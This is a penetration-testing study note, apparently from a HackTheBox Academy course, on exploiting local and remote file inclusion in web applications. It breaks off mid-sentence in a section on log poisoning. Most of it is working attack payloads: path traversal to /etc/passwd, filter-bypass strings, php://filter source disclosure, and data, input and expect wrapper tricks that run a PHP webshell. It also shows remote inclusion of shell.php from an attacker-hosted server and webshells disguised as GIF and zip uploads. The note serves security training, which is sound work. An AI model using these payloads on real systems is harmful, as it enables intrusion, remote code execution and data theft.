LFI vulnerability refers to that we use some ways to trick the templating engine or webserver to display files that's outside the supposed scope of files that is used to serve the webpage, for example instead of index.php, we instead trick it to display the php code that is used to handle login verification, this would lead to disclosure of information that reveals other vulnerability we can use, or worse, RCE / sensitive data disclosure. Below is a table that shows certain function in certain language that allows us to execute / read content:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|

Parameter tempering:

The most basic form of LFI is parameter tempering, imagine we are in a news website where we can choose different language:

```
https://flashnews.com/article/1633582/display.php?language=en
```

Of course, one could change the parameters to see news in different language, like es, ru, but this may also be abused if it is not properly guarded to display other files, like:
```
https://flashnews.com/article/1633582/display.php?language=/etc/passwd
```


Path Traversal:

A common practice when setting up webservers to pull a file to be displayed is to use prepared statement, the server maybe instructed to pull a file from the following directory:
```
directory = "/var/www/html/flashnews/articles/1633582/" + "<languageinput>"
```
In this case, simply entering /etc/passwd have no use as it simply got appended to the prepared directory, instead we need to use ../ to reset our directory back to the root, also append a / before if we suspect a filename prefix is in place, like the following:
```
include("lang_" . $_GET['language']);
```

In the above case, the payload required is /../../../../../../../../../etc/passwd. the first / is used to bypass filename prefix and the ../'s is used to reset the directory to root

Basic LFI Bypass:

Below is a list of payload that we can combine / use to bypass different LFI Protections


| Payload                 | Alternative        | Description                                                                                                                                                                                                                          | Usage                                                                      |
| ----------------------- | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------- |
| ....//                  | ..././ or `....\/` | Replace all ../ with ....//                                                                                                                                                                                                          | Bypass filter that does not recursively remove ../                         |
| %2e%2e%2f               | -                  | URL Encoding of ../ (Note: To use this bypass we must encode all character, including the /etc/passwd part )                                                                                                                         | Bypass filter that simply remove or detects . and /                        |
| approved path + payload | -                  | Sometimes, the webserver have a predefined approved paths that for example it may only accept paths from /languages/, in that case we can see normal request by intercepting with burp, then append our payload behind approved path | Bypassing filter that only accepts paths under a certain pre approved path |
| ../../etc/passwd%00.php | -                  | Prior to php version5.5, a nullbyte (%00) would terminate the string and have anything after the nullbyte discarded, we can use it to bypass file extension filter                                                                   | Bypassing file extension limit prior to php 5.5                            |
For php before 5.4, Path Truncation is also possible to be used to bypass file extension limit, refer to https://academy.hackthebox.com/app/module/23/section/1491 for extra details, but the recommendation is to use nullbyte termination as if a php version below 5.4 is discovered, nullbyte termination also can be used.

Using PHP Filters:

Sometimes we may want to extract other files or disclose source codes, but due to nature of webpage rendering, sometimes we can't just include that file and view it, as it would not render anything on the webpage (For example: a php config file), if that's the case, we can use PHP filters to convert the files into base64 encoding, so that it can properly display on our end.

Below is the filter to use and some example:
```
php://filter/read=convert.base64-encode/resource= #filter to use
```

Example:
```
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config.php

http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../backend/localveri.php
```

Using PHP Wrappers:

Aside from using the php filter, we can also use other php wrappers to perform a variety of action from data enumeration to RCE

Data Wrapper:

Data Wrapper can be used to include external data, including php code, however this is only doable if the allow_url_include setting is enabled, we can enumerate such setting by reading the php configuration file at `/etc/php/X.Y/apache2/php.ini` for apache or `/etc/php/X.Y/fpm/php.ini` for nginx, we can use the method introduced in Using PHP Filters to extract the files, below is example:
```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

After that, we can decode it and pipe it to grep to grep for allow_url_include, if it's on, then we can use it.

Using Data Wrapper for RCE:

We have mentioned that data wrapper can include external data, including php code, therefore the easiest way to archive RCE is to have it include a PHP Webshell encoded in base64

```
echo '<?php system($_GET["cmd"]); ?>' | base64 #Encoding webshell in base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Then, we pass the encoded string into the data wrapper with text.plain;base64, and we can access normally as if we are accessing normal php webshell:
```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

Using Input Wrapper for RCE:

similar to data wrapper, we can use input wrapper to archive RCE, notice that input wrapper operate based on POST Request, so the vulnerable parameter must also accept POST requests for such attacks to work, to perform this attack, we directly include the webshell in our post request and pass in our command parameter in 

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

Using Expect Wrapper for RCE:

The Expect wrappers allows us to run commands through the URL Streams, however, this wrapper is external, and requires manual installation and be enabled on the backend server, to discover its presence, we use the same way to discover whether allow url encode is enabled, but this time we check for the string expect, if we see extension=expect, it means it's available

Even if the presence of it is discovered, it does not guarantee us that it can be used by us, to use it, we simply access the variable in the following syntax:
```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" 
```

Remote File Inclusion and RCE:

Sometimes, we maybe able to include a file remotely if the vulnerable function allows such. We can use this to enumerate other local only ports or web apps, and potentially gain RCE, as we can use it to include a file under our control (which of course contains malicious code), refer to the table at beginning to see what function have RFI

First of all, to exploit RFI, allow_url_encode must be enabled as remote URL Inclusion is very dangerous. We can discover it with refer to previous section. Even if this option is enabled, it is not always exploitable, to verify it we can access a local url, this also prevent we got upright blocked by security solutions or waf.

Example:
```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

After we verified it's existence, we can now start write a piece of external resource that contains malicious code, first we can write a file that contains a webshell / reverse shell into a file that matches the language of the web application, using php as an example:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
Then, we host it under a port we choose, we can do it with python http server / goshs server:
```
sudo python3 -m http.server 7418
```
Then we access our malicious file in a way similar to our example:
```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:7418/shell.php&cmd=id
```

In case the protocol got blocked, we can use other protocols like ftp / smb, to do so we just need to host a ftp /smb server instead and access accordingly:
```
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'
#or
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

LFI and File Uploads:

If we also abuse a file upload vulnerability, combining with LFI this may grant us RCE if we are able to upload a shell to the file stash and include it with LFI

Creating Malicious GIF:

Below is a way to create a GIF file that is actually a webshell:
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
We only need to remember to add GIF8 to the beginning then it would be fine (GIF8 is the magic byte of GIF files)

Accessing Malicious GIF by the zip wrapper:

If the zip wrapper is enabled, we can use it to execute PHP code in zip format, the follwoign is how to create a shell zip:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
Notice that the file we upload would still be detected as a zip file, even though we zipped shell.php into shell.jpg, the rate of success would be higher if the website natively allows one to upload zip file, below is example to access it:
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
#Syntax
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/<zipname>%23<zipfile>&cmd=id
```

for attempting to use phar upload attack, refer to https://academy.hackthebox.com/app/module/23/section/1493

Log Poisoning: 

We can attempt to poison Server logs (located at `/var/log/apache2/`, `C:\xampp\apache\logs\` for apache or `/var/log/nginx/`, `C:\nginx\log\` for nginx), if the log is readable to us and we are able to control the content of the log in some manner, we can write 